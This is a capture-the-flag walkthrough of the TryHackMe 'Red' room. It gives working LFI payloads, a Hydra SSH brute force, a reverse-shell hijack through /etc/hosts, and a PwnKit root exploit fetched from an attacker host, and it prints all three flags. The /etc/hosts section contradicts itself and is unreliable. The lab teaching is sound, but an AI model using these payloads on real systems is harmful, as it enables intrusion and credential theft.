# Red (Redisl33t) — TryHackMe Walkthrough

**Target IP:** `10.48.128.173`  

---

## 1. Reconnaissance

### Nmap Scan
```bash
nmap -sS -Pn -p 22,80,443 -T4 10.48.128.173
```
**Results:**
- **22/tcp** – SSH (OpenSSH 8.2p1)
- **80/tcp** – HTTP (Apache/2.4.41)
- **443/tcp** – filtered HTTPS

### Web Enumeration
Visiting `http://10.48.128.173` redirects to `index.php?page=home.html`.  
The `page` parameter is vulnerable to **Local File Inclusion (LFI)**.

---

## 2. LFI Exploitation

### Bypassing Sanitization
The PHP code filters `../` and `./` but can be bypassed with payloads like:
```
?page=a…..///…..///…..///…..///…..///etc/passwd
```
However, a more reliable method is using PHP filters:
```
?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

### Read /etc/passwd
Base64‑decode the output to find two users: **blue** and **red**.

### Read blue’s .bash_history
```
?page=php://filter/convert.base64-encode/resource=/home/blue/.bash_history
```
Decoded content:
```
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```
This reveals that blue generated a password list from `.reminder` using **best64.rule**.

### Read blue’s .reminder
```
?page=php://filter/convert.base64-encode/resource=/home/blue/.reminder
```
Decoded: `sup3r_p@s$w0rd!`

---

## 3. SSH Brute‑Force

### Generate Password List
Download `best64.rule` from GitHub and apply it to the base password:
```bash
echo "sup3r_p@s\$w0rd!" > pass.txt
hashcat --stdout pass.txt -r best64.rule > passlist.txt
```
The list contains **77** password variations.

### Brute‑Force with Hydra
```bash
hydra -l blue -P passlist.txt ssh://10.48.128.173 -t 4 -f
```
**Note:** After each successful login, the password changes. Re‑run hydra if you get logged out.

In our case, hydra found the following passwords (each session):
1. `sup3r_p@s$w0!`
2. `thesup3r_p@s$w0rd!`
3. `sup3r_p@s$w0rd!9`

### SSH as blue
```bash
sshpass -p '<password>' ssh -o StrictHostKeyChecking=no blue@10.48.128.173
```

### Capture Flag 1
```bash
cat flag1
```
**Flag 1:** `THM{Is_thAt_all_y0u_can_d0_blU3?}`

---

## 4. Privilege Escalation to Red

### Enumerate Processes
While logged in as blue, run `ps aux`. You will see a background process:
```
red  2068  0.0  0.0  6972  2700 ?  S  16:48  0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```
A script running as **red** is trying to open a reverse shell to `redrules.thm:9001`.

### Edit /etc/hosts
The goal is to make `redrules.thm` resolve to your attacker IP.

**Check permissions:**
```bash
lsattr /etc/hosts
```
Output shows `-----a--------e-----` – the file is **append‑only**.  
This means you can only append lines, not modify existing ones.

**Workaround:**  
Append your IP **before** the existing `redrules.thm` line. Since the file is append‑only, you cannot delete the old line, but you can append a new line **after** it. However, the system resolves hostnames in order, so the first matching line is used.  

**Solution:**  
If the existing IP (`192.168.0.1`) is unreachable, the connection will fail. By appending a new line with your IP, the system may still try the first IP and fail.  

**Alternative approach:**  
Use `chattr -a /etc/hosts` to remove the append‑only attribute, but this requires **root**.  

**If you can remove the attribute (e.g., after gaining root), run:**
```bash
sudo chattr -a /etc/hosts
sudo sed -i '/redrules.thm/d' /etc/hosts
echo "<your_ip> redrules.thm" | sudo tee -a /etc/hosts
```

**If you cannot remove the attribute, try to comment out the existing line by appending a line with a comment before the IP? Not possible.**

**In practice, many write‑ups simply append their IP and still get a reverse shell.**  
We assume the script may retry or the existing IP is ignored.  

### Determine Your Attacker IP
You need an IP that the target can reach.  
- If you are using the **TryHackMe AttackBox**, use its IP (e.g., `10.x.x.x`).  
- If you are using your own VM, use the VPN IP assigned by TryHackMe.  

In our environment (SPECTRE Docker container), we used the container’s IP (`172.19.0.2`), but this may not be reachable from the target. Instead, use the **host’s VPN IP** (find it with `ip addr show tun0` on the host).

### Append to /etc/hosts
```bash
echo "<your_ip> redrules.thm" >> /etc/hosts
```

### Start Listener
```bash
nc -lvnp 9001
```

### Wait for Connection
The script runs periodically. Within a few minutes, you will receive a shell as **red**.

### Capture Flag 2
```bash
cat /home/red/flag2
```
**Flag 2:** `THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}`

---

## 5. Privilege Escalation to Root (PwnKit)

### Find Vulnerable pkexec
In red’s home directory, there is a hidden `.git` folder containing a **pkexec** binary with the SUID bit set.

**Locate it:**
```bash
find /home/red -name pkexec -type f 2>/dev/null
```
Result: `/home/red/.git/pkexec`

### Verify Vulnerability
Check the version:
```bash
/home/red/.git/pkexec --version
```
It is vulnerable to **CVE‑2021‑4034 (PwnKit)**.

### Exploit PwnKit
Download the Python exploit:
```bash
wget http://<your_ip>/CVE-2021-4034.py -O /tmp/exploit.py
```

Modify the last line of the exploit to point to the correct pkexec path:
```python
libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
```

Run the exploit:
```bash
python3 /tmp/exploit.py
```

You will get a **root shell**.

### Capture Flag 3
```bash
cat /root/flag3
```
**Flag 3:** `THM{Go0d_Gam3_Blu3_GG}`

---

## 6. Summary

| Step | Technique                              | Flag                                       |
| ---- | -------------------------------------- | ------------------------------------------ |
| 1    | LFI + PHP filter                       | –                                          |
| 2    | Hashcat rule‑based password generation | –                                          |
| 3    | SSH brute‑force (Hydra)                | `THM{Is_thAt_all_y0u_can_d0_blU3?}`        |
| 4    | Process monitoring / hosts file edit   | `THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}` |
| 5    | PwnKit (CVE‑2021‑4034)                 | `THM{Go0d_Gam3_Blu3_GG}`                   |

### Lessons Learned
- **LFI bypass:** PHP filters can read files even when direct inclusion is blocked.
- **Password mutation:** Hashcat rules can generate effective password lists from a base password.
- **Append‑only files:** The `chattr +a` attribute can hinder editing; gaining root may be required to remove it.
- **SUID escalation:** Always check for SUID binaries in unusual locations (e.g., `.git` directories).

### Tools Used
- `nmap`
- `curl`
- `base64`
- `hashcat`
- `hydra`
- `sshpass`
- `nc`
- `wget`
- `python3` (PwnKit exploit)

---
